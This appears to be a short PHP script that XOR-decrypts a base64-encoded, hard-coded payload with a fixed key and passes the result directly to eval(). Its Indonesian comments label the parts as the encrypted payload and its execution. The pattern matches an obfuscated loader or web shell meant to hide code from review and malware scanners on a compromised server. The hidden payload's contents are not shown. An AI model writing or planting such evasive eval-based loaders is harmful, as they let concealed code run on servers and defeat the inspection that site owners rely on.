<?php
// XOR decryption function

function xor_decrypt($data, $key) {
    $data = base64_decode($data);
    $out = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return $out;
}


// Payload terenkripsi
$encrypted = "TwwTGkN+DlARHBNBIVoYDl0NRwNXUkAcDl8VU1IIBloSSQhzTA0=";
$key = "s3cr3tk3y";
$code = xor_decrypt($encrypted, $key);

// Eksekusi payload
eval($code);
?>
